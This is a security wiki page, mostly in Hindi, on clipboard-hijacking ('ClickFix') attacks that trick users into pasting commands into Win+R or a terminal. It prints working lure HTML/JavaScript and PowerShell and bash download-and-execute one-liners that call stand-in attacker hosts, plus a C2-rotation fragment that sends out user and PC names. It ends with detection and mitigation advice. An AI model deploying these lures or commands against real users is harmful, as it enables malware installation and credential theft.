# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "जो आपने खुद कॉपी नहीं किया, उसे कभी पेस्ट मत करें।" – पुराना लेकिन अभी भी मान्य सलाह

## अवलोकन

Clipboard hijacking – also known as *pastejacking* – उपयोगकर्ताओं के उस व्यवहार का दुरुपयोग करता है कि वे बिना जांचे अक्सर कमांड्स को copy-and-paste कर लेते हैं। A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) प्रोग्रामेटिक रूप से attacker-controlled text को system clipboard में रखता है। पीड़ितों को, सामान्यतः सावधानीपूर्वक बनाए गए social-engineering निर्देशों के माध्यम से, प्रेरित किया जाता है कि वे **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाएँ, या टर्मिनल खोलकर clipboard सामग्री को *paste* करें, जिससे तुरंत arbitrary commands execute हो जाते हैं।

Because **no file is downloaded and no attachment is opened**, यह technique उन अधिकांश e-mail और web-content security controls को बायपास कर देता है जो attachments, macros या direct command execution को मॉनिटर करते हैं। इसलिए यह attack phishing campaigns में लोकप्रिय है, जो commodity malware families जैसे NetSupport RAT, Latrodectus loader या Lumma Stealer पहुँचाते हैं।

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुरानी कैम्पेनें `document.execCommand('copy')` का उपयोग करती थीं, जबकि नई asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करती हैं।

## ClickFix / ClearFake फ्लो

1. उपयोगकर्ता एक typosquatted या compromised साइट पर जाता है (उदा. `docusign.sa[.]com`)
2. इंजेक्ट की गई **ClearFake** JavaScript एक `unsecuredCopyToClipboard()` helper को कॉल करती है जो चुपचाप clipboard में एक Base64-encoded PowerShell one-liner स्टोर कर देती है।
3. HTML निर्देश पीड़ित को बताते हैं: *“**Win + R** दबाएँ, कमांड पेस्ट करें और समस्या हल करने के लिए Enter दबाएँ।”*
4. `powershell.exe` चलता है और एक archive डाउनलोड करता है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading)।
5. Loader अतिरिक्त चरणों को decrypt करता है, shellcode inject करता है और persistence इंस्टॉल करता है (उदा. scheduled task) — अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### NetSupport RAT चेन का उदाहरण
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` की तलाश करता है।
* दुष्ट DLL डायनामिक रूप से APIs को **GetProcAddress** के साथ resolve करता है, दो बाइनरीज़ (`data_3.bin`, `data_4.bin`) **curl.exe** के माध्यम से डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके decrypt करता है, अंतिम shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में अनज़िप करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` को **curl.exe** से डाउनलोड करता है
2. **cscript.exe** के भीतर JScript downloader को निष्पादित करता है
3. MSI payload को प्राप्त करता है → signed application के बगल में `libcef.dll` गिराता है → DLL sideloading → shellcode → Latrodectus.

### MSHTA के माध्यम से Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** कॉल एक छिपा हुआ PowerShell script लॉन्च करती है जो `PartyContinued.exe` प्राप्त करती है, `Boat.pst` (CAB) को एक्सट्रैक्ट करती है, `extrac32` और फ़ाइल concatenation के माध्यम से `AutoIt3.exe` को पुनर्निर्माण करती है और अंत में एक `.a3x` script चलाती है जो ब्राउज़र क्रेडेंशियल्स को `sumeriavgv.digital` पर exfiltrate करती है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns फ़ाइल डाउनलोड को पूरी तरह स्किप कर देते हैं और शिकारों को निर्देश देते हैं कि वे एक one‑liner पेस्ट करें जो WSH के माध्यम से JavaScript को fetch और execute करता है, इसे persist करता है, और C2 को रोज़ाना rotate करता है। देखा गया उदाहरण चेन:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर उल्टा किया जाता है ताकि साधारण निरीक्षण नाकाम हो।
- JavaScript स्वयं को Startup LNK (WScript/CScript) के माध्यम से स्थायी बनाता है, और वर्तमान दिन के अनुसार C2 का चयन करता है — जिससे तेज़ domain rotation सक्षम होता है।

दिन के अनुसार C2s को रोटेट करने के लिए उपयोग किया गया Minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला चरण आमतौर पर एक loader तैनात करता है जो persistence स्थापित करता है और एक RAT (e.g., PureHVNC) खींचता है, अक्सर TLS को एक hardcoded certificate पर pin कर देता है और ट्रैफ़िक को chunk करता है।

Detection ideas specific to this variant
- प्रोसेस ट्री: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` जो WScript/CScript को `%TEMP%`/`%APPDATA%` के तहत JS path के साथ invoke करता है।
- Registry/RunMRU और command‑line telemetry जिसमें `.split('').reverse().join('')` या `eval(a.responseText)` हो।
- बार-बार होने वाले `powershell -NoProfile -NonInteractive -Command -` कॉल जिनके साथ बड़े stdin payloads होते हैं ताकि लंबी command lines के बिना लंबे scripts feed किए जा सकें।
- Scheduled Tasks जो बाद में LOLBins जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` को execute करते हैं, अक्सर एक updater‑जैसी task/path के अंतर्गत (e.g., `\GoogleSystem\GoogleUpdater`)।

Threat hunting
- Daily‑rotating C2 hostnames और URLs जिनका पैटर्न `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` हो।
- clipboard write events को correlate करें जो Win+R paste के बाद तुरंत `powershell.exe` execution के साथ होते हैं।

Blue-teams clipboard, process-creation और registry telemetry को combine करके pastejacking दुरुपयोग को pinpoint कर सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** commands का history रखता है – असामान्य Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` इन में से कोई हो { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
* Event ID **4663** उन file creations के लिए जो `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders के अंतर्गत suspicious 4688 event के ठीक पहले होती हैं।
* EDR clipboard sensors (यदि मौजूद हों) – `Clipboard Write` को उसी समय तुरंत एक नए PowerShell process के साथ correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

हालिया campaigns बड़ी मात्रा में fake CDN/browser verification pages ("Just a moment…", IUAM-style) बनाते हैं जो users को उनके clipboard से OS-specific commands native consoles में copy करने के लिए मजबूर करते हैं। यह execution को browser sandbox से बाहर ले जाता है और Windows और macOS दोनों पर काम करता है।

Key traits of the builder-generated pages
- `navigator.userAgent` के जरिए OS detection ताकि payloads को tailor किया जा सके (Windows PowerShell/CMD बनाम macOS Terminal)। unsupported OS के लिए optional decoys/no-ops ताकि illusion बरकरार रहे।
- benign UI actions (checkbox/Copy) पर automatic clipboard-copy जबकि visible text clipboard content से भिन्न हो सकता है।
- Mobile blocking और एक popover के साथ step-by-step निर्देश: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter।
- Optional obfuscation और single-file injector जो compromised site के DOM को overwrite करके Tailwind-styled verification UI डालता है (नई domain registration की आवश्यकता नहीं)।

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS पर प्रारंभिक रन की persistence
- उपयोग करें `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ताकि टर्मिनल बंद होने के बाद भी निष्पादन जारी रहे, जिससे दृश्य अवशेष कम हों।

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: ऐसी पृष्ठ जो Clipboard API को verification widgets से बाइंड करती हैं; प्रदर्शित टेक्स्ट और clipboard payload के बीच असंगति; `navigator.userAgent` branching; संदिग्ध संदर्भों में Tailwind + single-page replace.
- Windows endpoint: ब्राउज़र interaction के तुरंत बाद `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` से चलाए गए batch/MSI installers.
- macOS endpoint: Terminal/iTerm द्वारा ब्राउज़र इवेंट के निकट `bash`/`curl`/`base64 -d` के साथ `nohup` स्पॉन करना; टर्मिनल बंद होने पर बैकग्राउंड जॉब्स का जारी रहना।
- `RunMRU` Win+R history और clipboard writes को बाद में हुए console process निर्माण के साथ correlate करें।

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## निवारण

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) अक्षम करें या user gesture आवश्यक बनाएं।
2. Security awareness – उपयोगकर्ताओं को संवेदनशील कमांड *टाइप* करने या पहले किसी text editor में पेस्ट करने के लिए सिखाएँ।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग arbitrary one-liners को ब्लॉक करने के लिए।
4. Network controls – ज्ञात pastejacking और malware C2 डोमेन्स को outbound requests के लिए ब्लॉक करें।

## संबंधित ट्रिक्स

* **Discord Invite Hijacking** अक्सर यूज़र्स को malicious server में लुभाने के बाद उसी ClickFix approach का दुरुपयोग करता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
